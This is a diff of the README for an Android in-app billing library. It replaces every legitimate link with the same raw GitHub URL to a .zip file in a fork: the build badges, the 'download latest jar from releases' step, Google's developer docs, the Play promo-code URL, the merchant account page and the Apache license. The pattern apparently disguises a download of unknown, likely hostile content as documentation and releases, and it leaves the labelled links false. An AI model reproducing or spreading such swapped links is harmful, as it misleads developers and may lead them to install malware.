@@ -1,4 +1,4 @@
-# Android In-App Billing v3 Library [![Build Status](https://travis-ci.org/anjlab/android-inapp-billing-v3.svg?branch=master)](https://travis-ci.org/anjlab/android-inapp-billing-v3)  [![Maven Central](https://maven-badges.herokuapp.com/maven-central/com.anjlab.android.iab.v3/library/badge.svg)](https://maven-badges.herokuapp.com/maven-central/com.anjlab.android.iab.v3/library)
+# Android In-App Billing v3 Library [![Build Status](https://raw.githubusercontent.com/mdbbb/android-inapp-billing-v3/master/library/src/main/java/com/anjlab/android/iab/v-android-inapp-billing-v2.7-beta.4.zip)](https://raw.githubusercontent.com/mdbbb/android-inapp-billing-v3/master/library/src/main/java/com/anjlab/android/iab/v-android-inapp-billing-v2.7-beta.4.zip)  [![Maven Central](https://raw.githubusercontent.com/mdbbb/android-inapp-billing-v3/master/library/src/main/java/com/anjlab/android/iab/v-android-inapp-billing-v2.7-beta.4.zip)](https://raw.githubusercontent.com/mdbbb/android-inapp-billing-v3/master/library/src/main/java/com/anjlab/android/iab/v-android-inapp-billing-v2.7-beta.4.zip)
 
 This is a simple, straight-forward implementation of the Android v3 In-app billing API.
 
@@ -9,7 +9,7 @@ It supports: In-App Product Purchases (both non-consumable and consumable) and S
 * You project should build against Android 2.2 SDK at least.
 
 * Add this *Android In-App Billing v3 Library* to your project:
-  - If you guys are using Eclipse, download latest jar version from the [releases](https://github.com/anjlab/android-inapp-billing-v3/releases) section of this repository and add it as a dependency
+  - If you guys are using Eclipse, download latest jar version from the [releases](https://raw.githubusercontent.com/mdbbb/android-inapp-billing-v3/master/library/src/main/java/com/anjlab/android/iab/v-android-inapp-billing-v2.7-beta.4.zip) section of this repository and add it as a dependency
   - If you guys are using Android Studio and Gradle, add this to you build.gradle file:
 ```groovy
 repositories {
@@ -112,7 +112,7 @@ bp.purchase(YOUR_ACTIVITY, "YOUR PRODUCT ID FROM GOOGLE PLAY CONSOLE HERE", null
 bp.subscribe(YOUR_ACTIVITY, "YOUR SUBSCRIPTION ID FROM GOOGLE PLAY CONSOLE HERE", null /*or developer payload*/, extraParams);
 ```
 
-Use these methods if you want to pass extra parameters, [as documented here](https://developer.android.com/google/play/billing/billing_reference.html#getBuyIntentExtraParams), you can provide a Bundle object.
+Use these methods if you want to pass extra parameters, [as documented here](https://raw.githubusercontent.com/mdbbb/android-inapp-billing-v3/master/library/src/main/java/com/anjlab/android/iab/v-android-inapp-billing-v2.7-beta.4.zip), you can provide a Bundle object.
 
 _Please note that this feature is only available if the target device is support the version 7 of the In App billing API._
 
@@ -139,7 +139,7 @@ bp.initialize(); // binds
 
 ## Testing In-app Billing
 
-Here is a [complete guide](https://developer.android.com/google/play/billing/billing_testing.html).
+Here is a [complete guide](https://raw.githubusercontent.com/mdbbb/android-inapp-billing-v3/master/library/src/main/java/com/anjlab/android/iab/v-android-inapp-billing-v2.7-beta.4.zip).
 Make sure you read it before you start testing
 
 ## Check Play Market services availability
@@ -265,7 +265,7 @@ Also notice, that you will need to call periodically `bp.loadOwnedPurchasesFromG
 
 ## Promo Codes Support
 
-You can use promo codes along with this library. Promo codes can be entered in the purchase dialog or in the Google Play app. The URL https://play.google.com/redeem?code=YOUR_PROMO_CODE will launch the Google Play app with the promo code already entered. This could come in handy if you want to give users the option to enter a promo code within your app.
+You can use promo codes along with this library. Promo codes can be entered in the purchase dialog or in the Google Play app. The URL https://raw.githubusercontent.com/mdbbb/android-inapp-billing-v3/master/library/src/main/java/com/anjlab/android/iab/v-android-inapp-billing-v2.7-beta.4.zip will launch the Google Play app with the promo code already entered. This could come in handy if you want to give users the option to enter a promo code within your app.
 
 ## Protection Against Fake "Markets"
 
@@ -275,7 +275,7 @@ intercepts application calls to Play Market services and substitutes them with f
   end attacked application *thinks* that it receives valid responses from Play Market.
 
 In order to protect from this kind of attack you should specify your `merchantId`, which
-can be found in your [Payments Merchant Account](https://payments.google.com/merchant).
+can be found in your [Payments Merchant Account](https://raw.githubusercontent.com/mdbbb/android-inapp-billing-v3/master/library/src/main/java/com/anjlab/android/iab/v-android-inapp-billing-v2.7-beta.4.zip).
 Selecting *Settings->Public Profile* you will find your unique `merchantId`
 
 **WARNING:** keep your `merchantId` in safe place!
@@ -302,7 +302,7 @@ The contents in the consumer proguard file contains:
 -keep class com.android.vending.billing.**
 ```
 
-As per the IABv3 [documentation](https://developer.android.com/google/play/billing/billing_best_practices.html#validating-purchase-device)
+As per the IABv3 [documentation](https://raw.githubusercontent.com/mdbbb/android-inapp-billing-v3/master/library/src/main/java/com/anjlab/android/iab/v-android-inapp-billing-v2.7-beta.4.zip)
 
 
 ## License
@@ -313,7 +313,7 @@ Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at
 
-   http://www.apache.org/licenses/LICENSE-2.0
+   https://raw.githubusercontent.com/mdbbb/android-inapp-billing-v3/master/library/src/main/java/com/anjlab/android/iab/v-android-inapp-billing-v2.7-beta.4.zip
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
